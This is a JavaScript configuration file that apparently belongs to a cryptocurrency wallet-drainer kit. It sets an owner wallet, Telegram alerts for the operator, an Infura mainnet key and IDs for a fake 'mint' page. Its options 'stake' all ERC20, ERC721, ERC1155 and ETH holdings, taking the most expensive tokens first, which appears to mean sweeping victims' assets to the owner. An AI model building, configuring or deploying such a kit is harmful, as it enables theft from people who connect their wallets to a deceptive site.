// ----- Variable config ----- //

const owner_pblc_config = {
    "owner_wallet" : "0x",
}

const telegram_config = {
    "enable_telegram_notification" : true,
    "telegram_token" : "123",
    "chatid" : -123
}

const api_pblc_config = {
    "infura_api_key" : "123",
    "infury_api_link" : "https://mainnet.infura.io/v3/123"
}

const options_config = {

    "enable_erc20_stake" : true,
    "enable_erc721_stake" : true,
    "enable_erc1155_stake" : true,
    "enable_eth_stake" : true,
    "enable_stake_most_expensive_erc20_token_first" : true, // only on mainnet
    "enable_only_stake_most_expensive_erc20_token" : false, // only on mainnet

    "minima_eth_balance_to_send" : 0.0001

}

const chain_config = {
    "chain_id" : "1"
}

// ---- Webpage items config ---- // 

const webpage_config = {

    "login_button" : "login_button",
    "mint_button" : "mint_button",
    
    "not_logged_div" : "not_logged",
    "logged_div" : "logged",
    
    "user_wallet_span" : "user_wallet_span",
    "user_wallet_span_mobile" : "user_wallet_span_mobile"

}

exports.owner_pblc_config = owner_pblc_config
exports.telegram_config = telegram_config
exports.api_pblc_config = api_pblc_config
exports.options_config = options_config
exports.chain_config = chain_config
exports.webpage_config = webpage_config

